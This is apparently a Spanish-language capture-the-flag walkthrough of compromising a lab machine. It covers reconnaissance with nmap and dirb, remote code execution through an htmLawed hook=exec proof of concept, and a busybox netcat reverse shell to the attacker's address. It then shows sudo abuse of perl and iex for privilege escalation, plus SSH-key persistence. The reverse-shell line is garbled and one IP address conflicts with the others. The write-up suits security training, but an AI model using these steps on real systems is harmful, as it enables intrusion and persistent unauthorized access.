Identificamos el equipo a vulnerar -> netdiscover -r 192.168.1.0/24 e identificamos la ip 192.168.1.56

Realizamos un escaneo de puertos rápido y sencillo para determinar todos aquellos puertos abiertos en la máquina e identificar posibles vectores de ataque.

nmap -p- --open --min-rate 5000 -n -Pn 192.168.1.56

Una vez visualizados los dos puertos abiertos (ssh, http), realizamos un escaneo más exhaustivo con una lista de scripts de reconocimiento por defecto para determinar los servicios

nmap -p 22,80 -sVC 192.168.1.56

Ya con el nmap, vemos que el servicio tiene una página robots.txt

Al ser un servicio web por http, podemos realizar un pequeño chequeo de diferentes directorios dentro de la página web, mientras inspeccionamos la página a mano:

dirb http://192.168.1.55

Mientras se ejecuta revisamos la página principal y vemos que es la normal de un apache. El dirbuster nos ha determinado dos un robots.txt y un index.html. Dentro del robots.txt nos sugiere otro direccionamiento, por lo que accedemos a revisarlo

Parece la documentación de un script en php que permite procesar texto de HTML. Es una capa de seguridad qye puede llegar a neutralizar vulnerabilidades de XSS (crosSite Scripting), en este caso parece deshabilitada. Leyendo el documento, vemos que el software se apoya de un ejecutable "htmLawed.php", por lo que intentamos ejecutar el script. Vemos que existe la ruta http://192.168.1.56/htmLawed/htmLawed.php pero al entrar no parece hacer nada.

Si buscamos información, encontraremos un repositorio en github con información adicional: https://github.com/kesar/HTMLawed. Dentro encontramos diferentes scripts php que nos pueden servir, en específico uno que es htmLawed_test.php. Al entrar, vemos un cuadro de texto para probar comandos en JS, y podemos procesarlo o ejecutarlo directamente sobre el navegador. Esto no nos ofrece mucho ya que no tenemos forma de ejcutar código malicioso dentro de la página.

Buscamos un exploit que pueda vulnerar la máquina y nos deje ejecutar un RCE en el cuadro de texto. Buscando encontramos una PoC, en la cual al enviarle hook=exec, se puede ejecutar comandos en el recuadro de texto


Viendo este RCE, vamos a enviarnos una reverse shell a nuestro equipo. Probé diferentes formas y solo me funcionó la reverse shell con el uso de 'busybox' y netcat:

busybox	nc scs4192.168.1.103 445 -e /bin/bash

Buscamos escalar privilegios a algún usuario del sistemas
ls -la /home

Vemos un directorio "noname" en el que solo los usuarios y grupos de noname pueden acceder

sudo -l
POdemos observar, que al chequear los permisos de sudo, tenemos permisos para ejecutar perl como noname y sin pass:

sudo -u noname /usr/bin/perl "exec '/bin/bash'"

Una vez siendo noname, podemos leer la flag:

BONUS:
Podemos mantener una persistencia, para no tener que repetir el proceso en caso de volver a conectarse con el usuario, y sin cambiarle la contraseña ni nada, la forma es crear un par clave con ssh-keygen para así, poder conectarnos mediante la clave privada al sistema, las veces que queramos. Creamos las claves con ssh-keygen, y una vez finaliza, copiamos id_rsa (clave privada) la cual será la que usaremos para realizar las conexiones remotas. Por el otro lado, la clave pública será copiada dentro del archivo de la máquina víctima ~/.ssh/authorized_keys.


Una vez tenemos la flag, tenemos que escalar los privilegios a root para conseguir un acceso completo, revisando los permisos vemos que podemos ejecutar como root sin contraseña "/usr/bin/iex"
Buscando un poco de información, podemos ver que se pueden ejecutar comandos del sistema dentro de la consola con:
:os.cmd('command') (con comillas simples, dobles no funciona)

Sabiendo esto, podemos movernos y obtener la flag de root de forma sencilla.

